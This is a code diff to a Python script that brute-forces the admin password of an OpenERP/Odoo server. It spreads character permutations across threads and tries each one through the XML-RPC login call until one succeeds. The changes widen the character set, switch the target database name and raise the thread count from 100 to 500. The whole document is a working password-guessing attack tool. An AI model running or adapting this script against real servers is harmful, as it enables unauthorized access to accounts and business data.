@@ -7,7 +7,7 @@ import string,math,sys
 import itertools,time
 
 PrinTable = string.printable.replace(" ",'').replace('\t\n\r\x0b\x0c','').replace("\\",'')
-PrinTable = string.digits +"asdfghjk"
+PrinTable = string.digits +string.letters
 LENGTH = 3
 
 comb = list(itertools.permutations(list(PrinTable),LENGTH))
@@ -28,11 +28,14 @@ class Login(threading.Thread):
         for password in self.block:
             try:
                 SVR = ServerProxy("http://localhost:8069/xmlrpc/common")
-                answer = SVR.login("V7","admin",password)
+                answer = SVR.login("OE7","admin",password)
             except :print "Error"
             if answer == 1 :
+                print "\n"
+                print "\n"
                 print "--------------------------------------------"
                 print "Finally find password : %s"%password,time.ctime()
+                print "--------------------------------------------"
                 break
 
 def chunks(arr, m):
@@ -48,4 +51,4 @@ def makethread(n):
     
 if __name__ == '__main__':
     
-    makethread(100)
+    makethread(500)
